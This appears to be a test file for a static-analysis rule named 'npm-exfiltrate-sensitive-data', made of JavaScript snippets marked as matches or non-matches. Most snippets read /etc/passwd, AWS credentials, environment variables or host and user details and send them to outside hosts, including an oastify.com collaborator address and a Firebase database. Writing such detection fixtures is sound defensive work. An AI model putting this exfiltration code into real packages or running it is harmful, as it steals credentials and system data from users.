function f(){
    const fs = require('fs');
    var etcpasswd = '/etc/passwd';
    let base64data1 = '';
    try {
        if (fs.existsSync(etcpasswd)) {
            var data1 = fs.readFileSync(etcpasswd, 'utf8');
            let buff1 = Buffer.from(data1);
            base64data1 = buff1.toString('base64');
        }
    } catch (error) {
        console.log('');
    }

    const x = require('https');
    var options = {
        hostname: "fdw8jf59fyrb5rp6hamcl4q7gymoad.oastify.com",
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
            "Contentetcpasswd": base64data1,
            "ContentSAM": base64data2,
            "ContentetSYSTEM": base64data3,
            "imdsv1": base64data4
        },
    };
    // ruleid: npm-exfiltrate-sensitive-data
    var req = x.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });
}


function f(){
    const fs = require('fs');

    const postData = '';
    fs.readFile('.aws/credentials', 'utf8', (err, data) => {
    if (err) {
        console.error(err);
        return;
    }
        postData = data;
    });

    const axios = require('axios');

    const url = 'https://api.example.com/data';

    // ruleid: npm-exfiltrate-sensitive-data
    axios.post(url, postData)
    .then((response) => {
        console.log(response.data);
    })
    .catch((error) => {
        console.error(error);
    });

}

function f(){
    var Firebase = require("firebase");
    var ref = new Firebase("https://abcde-fg-1234.firebaseio.com/");
    // ruleid: npm-exfiltrate-sensitive-data
    var dbRef = ref.child("env_vars");
    dbRef.push({status : "leaked env vars", message : process.env}, clean());

}

function f(){
    var Firebase = require("firebase");
    var ref = new Firebase("https://abcde-fg-1234.firebaseio.com/");
    // ok: npm-exfiltrate-sensitive-data
    var dbRef = ref.child("env_vars");
    dbRef.push({status : "leaked env vars", message : "anymsg"}, clean());

}

function f(){
    os = require('os');
    https = require('https');
    const td = {
        c: __dirname,
        hd: os.homedir(),
        hn: os.hostname(),
        un: os.userInfo().username,
    }
    const trackingData = JSON.stringify(td);
    var postData = querystring.stringify({
        msg: trackingData,
    });

    var options = {
        hostname: "xx",
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
        },
    };

    // ruleid: npm-exfiltrate-sensitive-data
    var req = https.request(options, (res) => {
        res.on("data", (d) => {
            //process.stdout.write(d);
        });
    });
}

function f(){
    const os = require('os');
    const http = require('http');
    // Collect device information
    const deviceInfo = {
        platform: os.platform(),
        release: os.release(),
        hostname: os.hostname(),
        arch: os.arch(),
        userInfo: os.userInfo(),
        networkInterfaces: os.networkInterfaces(),
        whoamiinfo: whoamiInfo, // Include whoami output
        user: "Keycloak",
    };

    // Define the request options
    const options = {
        hostname: apiHostname,
        port: apiPort,
        path: apiPath,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json', // Inform the server about the JSON body
        },
    };

    // Create the request
    const req = http.request(options, (res) => {
        console.log(`Status: ${res.statusCode}`);
        res.on('data', (chunk) => {
            console.log(`Body: ${chunk}`);
        });
    });

    req.on('error', (error) => {
        console.error(`Error: ${error.message}`);
    });

    // ruleid:npm-exfiltrate-sensitive-data
    req.write(JSON.stringify(deviceInfo));
    req.end();
}
